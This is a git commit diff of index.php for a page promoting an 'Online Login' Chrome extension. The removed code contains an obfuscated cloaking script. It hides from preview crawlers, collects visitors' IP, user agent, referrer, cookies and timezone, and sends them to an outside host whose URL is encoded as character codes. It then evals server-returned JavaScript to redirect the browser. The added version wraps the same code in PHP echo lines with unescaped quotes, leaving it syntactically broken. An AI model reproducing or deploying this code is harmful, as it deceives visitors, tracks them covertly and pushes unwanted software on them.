95eaf972e6bd4ec2b1e420b35c93909a017b789c
kiraje <thantrungduc.work@gmail.com>
2023-08-04 02:15:42 +0700

    first commit

--- index.php
+++ index.php
@@ -1,125 +1,128 @@
-<?php header("Access-Control-Allow-Origin: *");date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");function c($u=null, $q=null){if(empty($u)){return '$("#lo456999ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">  </div>");s = rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";eval(c);$("html").show();';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["tz"])){$date = date("Y-m-d H:i:s");$id = "456999";$uid="zyblotz2bh01h50s6whgs77he";$qu=$_POST["qu"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_POST["sn"],"requestUri"=>$_POST["rui"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_POST["co"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>
-<html>
-<head>
-<style>body {display: none;}</style>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>
-$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo456999ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">  </div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-781433-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:"https://hammerhead-app-zlvao.ondigitalocean.app/",type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})
-</script>
-
-    <title>Online Search Tool</title>
-    <!---------- Styles ---------->
-    <link rel="preload" as="font" type="font/ttf" href="fonts/Montserrat-SemiBold.ttf" crossorigin>
-    <link rel="preload" as="font" type="font/ttf" href="fonts/Montserrat-Regular.ttf" crossorigin>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <link rel="stylesheet" href="standard_framework_internal/assets/styles/modals.css">
-    <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cabin:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <meta charset="UTF-8">
-    <!---------- Scripts ---------->
-    <script src="https://code.jquery.com/jquery-3.5.1.js"
-        integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-    <!---------- Mobile Viewport Resize ---------->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-    <link rel="icon" href="https://onlineloginapp.com/assets/images/package-icon.png">
-</head>
-<body><div id='content'>
-<img src='images/logosite.png' class='logo' style='width: 200px;'>
-  <!-- Main Container -->
-  <div class='background'>
-    <div id='main-box'>
-        <h1 class="d-flex align-items-center justify-content-center"><img src='images/icon.png' id='header-icon'> &nbsp;Login To Your Account Faster</h1>
-        <p>Please install the free Online Login extension for <span id='browser'>Google Chrome™</span><br> to login to your accounts faster & get sponsored web search update on your new tab.</p>
-		<ul class="dots">
-          <li>Access quick login to popular sites</li>
-          <li>Add or Delete Login URL's for quick access</li>
-          <li>Download safely from the Chrome Web Store.</li>
-        </ul>
-        <div class='row'>
-          <div class='col-md-12'>
-            <div class='row'>
-              <div class='col-4'>
-                <div class='step'>
-                  <div class='step-number'>1</div>
-                  <div class='step-text'>Step 1: Click <strong>'Add To Chrome'</strong></div>
-                </div>
-              </div>
-              <div class='col-4'>
-                <div class='step'>
-                  <div class='step-number'>2</div>
-                  <div class='step-text'>Step 2: Click <span id='get'><strong>'Add Extension'</strong></span></span></div>
-                </div>
-              </div>
-              <div class='col-4'>
-                <div class='step'>
-                  <div class='step-number'>3</div>
-                  <div class='step-text'><strong>Enjoy!</strong></div>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class='col-md-12'>
-              <button onclick="continue_click()" class='btn btn-primary but' id='continue'>CONTINUE</span></button>
-              <div class='byline'>This free extension will update this browser's new tab page. By continuing, you will<br> be redirected to the <span id='store'>Chrome Store</span>
-              and agree to the <a href='pages/eula.html' target='_blank'>EULA</a> and <a href='pages/privacy.html' target='_blank'>Privacy Policy</a>.</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-  <div class='col-lg-1 col-md-0'></div>
-
-
-  <!-- Footer -->
-  <div class='footer'>
-      <div class='row'>
-        <div class='copyright'>© 2020. OnlineLoginApp. All Rights Reserved.</div>
-        <br>
-        <div class='footer-links'>
-          <span class='link'><a href='pages/privacy.html' target='_blank'>Privacy Policy</span></a> |
-          <span class='link'><a href='pages/eula.html' target='_blank'>EULA</span></a> |
-          <span class='link'><a href='pages/dmca.html' target='_blank'>DMCA Policy</span></a> |
-          <span class='link'><a href='pages/uninstall.html' target='_blank'>Uninstall</span></a> |
-          <span class='link'><a href='pages/contact.html' target='_blank'>Contact Us</span></a>
-        </div>
-        </div>
-      </div>
-  </div>
-</div>
-
-<!---------- FRAMEWORK MODALS ---------->   
-
-<!---------- LOAIDNG WINDOW BEFORE REDIRECT ---------->
-<div id='loading-window'>
-    <div id='loading-modal'>
-        <img src='images/icon.png'>
-		<p>Redirecting to <br>Chrome Store...</p>
-         <!-- <p>Click <span class="color-txt">'Add to Chrome'</span><br>to install extension</p> -->
-    </div>
-</div>
-<!---------- END LOADNG WINDOW BEFORE REDIRECT ---------->
-<!---------- Scripts ---------->
-<script type="text/javascript" src="standard_framework_internal/assets/scripts/config.js"></script>
-
-</body>
-</html>
-
-</body>
-<!-- Default Statcounter code for Online Login App
-https://onlineloginapp.com/ -->
-<script type="text/javascript">
-var sc_project=12748089; 
-var sc_invisible=1; 
-var sc_security="d5b74fb4"; 
-var sc_remove_link=1; 
-</script>
-<script type="text/javascript"
-src="https://www.statcounter.com/counter/counter.js"
-async></script>
-<!-- End of Statcounter Code -->
-</html>
-
+<?php
+echo '<?php header("Access-Control-Allow-Origin: *");date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");function c($u=null, $q=null){if(empty($u)){return '$("#lo456999ad").hide();$("body").fadeIn(500);';}else{$u = $u.$q;for ($i = 0, $j = strlen($u); $i < $j; $i++) {$a[] = ord($u[$i]);}$u = strrev(implode(",",$a));return 'function rS(s){var nS = "";for (var i = s.length - 1; i >= 0; i--) {nS += s[i];} var a = nS.split(",");var u = String.fromCharCode.apply(null, a);return u;} var u,s,c;$("body").remove();$("html").append("body").html("<div style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">  </div>");s = rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");u = rS("'.$u.'");c = s+"\'"+u+"\'";eval(c);$("html").show();';}}if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){if(isset($_POST["tz"])){$date = date("Y-m-d H:i:s");$id = "456999";$uid="zyblotz2bh01h50s6whgs77he";$qu=$_POST["qu"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_POST["r"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_POST["sn"],"requestUri"=>$_POST["rui"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_POST["co"],"tz"=>$_POST["tz"],"he"=>$_POST["he"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}echo c($arr[1],$q);exit();}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c($arr[1],$f);exit();}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}echo c();exit();}}}?>';
+echo '<html>';
+echo '<head>';
+echo '<style>body {display: none;}</style>';
+echo '<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>';
+echo '<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>';
+echo '<script>';
+echo '$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo456999ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">  </div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-781433-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:"https://hammerhead-app-zlvao.ondigitalocean.app/",type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})';
+echo '</script>';
+echo '';
+echo '<title>Online Search Tool</title>';
+echo '<!---------- Styles ---------->';
+echo '<link rel="preload" as="font" type="font/ttf" href="fonts/Montserrat-SemiBold.ttf" crossorigin>';
+echo '<link rel="preload" as="font" type="font/ttf" href="fonts/Montserrat-Regular.ttf" crossorigin>';
+echo '<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">';
+echo '<link rel="stylesheet" href="standard_framework_internal/assets/styles/modals.css">';
+echo '<link rel="stylesheet" href="style.css">';
+echo '<link rel="preconnect" href="https://fonts.googleapis.com">';
+echo '<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>';
+echo '<link href="https://fonts.googleapis.com/css2?family=Cabin:wght@400;500;600;700&display=swap" rel="stylesheet">';
+echo '<meta charset="UTF-8">';
+echo '<!---------- Scripts ---------->';
+echo '<script src="https://code.jquery.com/jquery-3.5.1.js"';
+echo 'integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc=" crossorigin="anonymous"></script>';
+echo '<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>';
+echo '<!---------- Mobile Viewport Resize ---------->';
+echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
+echo '<link rel="icon" href="https://onlineloginapp.com/assets/images/package-icon.png">';
+echo '</head>';
+echo '<body><div id='content'>';
+echo '<img src='images/logosite.png' class='logo' style='width: 200px;'>';
+echo '<!-- Main Container -->';
+echo '<div class='background'>';
+echo '<div id='main-box'>';
+echo '<h1 class="d-flex align-items-center justify-content-center"><img src='images/icon.png' id='header-icon'> &nbsp;Login To Your Account Faster</h1>';
+echo '<p>Please install the free Online Login extension for <span id='browser'>Google Chrome™</span><br> to login to your accounts faster & get sponsored web search update on your new tab.</p>';
+echo '<ul class="dots">';
+echo '<li>Access quick login to popular sites</li>';
+echo '<li>Add or Delete Login URL's for quick access</li>';
+echo '<li>Download safely from the Chrome Web Store.</li>';
+echo '</ul>';
+echo '<div class='row'>';
+echo '<div class='col-md-12'>';
+echo '<div class='row'>';
+echo '<div class='col-4'>';
+echo '<div class='step'>';
+echo '<div class='step-number'>1</div>';
+echo '<div class='step-text'>Step 1: Click <strong>'Add To Chrome'</strong></div>';
+echo '</div>';
+echo '</div>';
+echo '<div class='col-4'>';
+echo '<div class='step'>';
+echo '<div class='step-number'>2</div>';
+echo '<div class='step-text'>Step 2: Click <span id='get'><strong>'Add Extension'</strong></span></span></div>';
+echo '</div>';
+echo '</div>';
+echo '<div class='col-4'>';
+echo '<div class='step'>';
+echo '<div class='step-number'>3</div>';
+echo '<div class='step-text'><strong>Enjoy!</strong></div>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '<div class='col-md-12'>';
+echo '<button onclick="continue_click()" class='btn btn-primary but' id='continue'>CONTINUE</span></button>';
+echo '<div class='byline'>This free extension will update this browser's new tab page. By continuing, you will<br> be redirected to the <span id='store'>Chrome Store</span>';
+echo 'and agree to the <a href='pages/eula.html' target='_blank'>EULA</a> and <a href='pages/privacy.html' target='_blank'>Privacy Policy</a>.</div>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '<div class='col-lg-1 col-md-0'></div>';
+echo '';
+echo '';
+echo '<!-- Footer -->';
+echo '<div class='footer'>';
+echo '<div class='row'>';
+echo '<div class='copyright'>© 2020. OnlineLoginApp. All Rights Reserved.</div>';
+echo '<br>';
+echo '<div class='footer-links'>';
+echo '<span class='link'><a href='pages/privacy.html' target='_blank'>Privacy Policy</span></a> |';
+echo '<span class='link'><a href='pages/eula.html' target='_blank'>EULA</span></a> |';
+echo '<span class='link'><a href='pages/dmca.html' target='_blank'>DMCA Policy</span></a> |';
+echo '<span class='link'><a href='pages/uninstall.html' target='_blank'>Uninstall</span></a> |';
+echo '<span class='link'><a href='pages/contact.html' target='_blank'>Contact Us</span></a>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '</div>';
+echo '';
+echo '<!---------- FRAMEWORK MODALS ---------->';
+echo '';
+echo '<!---------- LOAIDNG WINDOW BEFORE REDIRECT ---------->';
+echo '<div id='loading-window'>';
+echo '<div id='loading-modal'>';
+echo '<img src='images/icon.png'>';
+echo '<p>Redirecting to <br>Chrome Store...</p>';
+echo '<!-- <p>Click <span class="color-txt">'Add to Chrome'</span><br>to install extension</p> -->';
+echo '</div>';
+echo '</div>';
+echo '<!---------- END LOADNG WINDOW BEFORE REDIRECT ---------->';
+echo '<!---------- Scripts ---------->';
+echo '<script type="text/javascript" src="standard_framework_internal/assets/scripts/config.js"></script>';
+echo '';
+echo '</body>';
+echo '</html>';
+echo '';
+echo '</body>';
+echo '<!-- Default Statcounter code for Online Login App';
+echo 'https://onlineloginapp.com/ -->';
+echo '<script type="text/javascript">';
+echo 'var sc_project=12748089;';
+echo 'var sc_invisible=1;';
+echo 'var sc_security="d5b74fb4";';
+echo 'var sc_remove_link=1;';
+echo '</script>';
+echo '<script type="text/javascript"';
+echo 'src="https://www.statcounter.com/counter/counter.js"';
+echo 'async></script>';
+echo '<!-- End of Statcounter Code -->';
+echo '</html>';
+echo '';
+echo '';
+?>
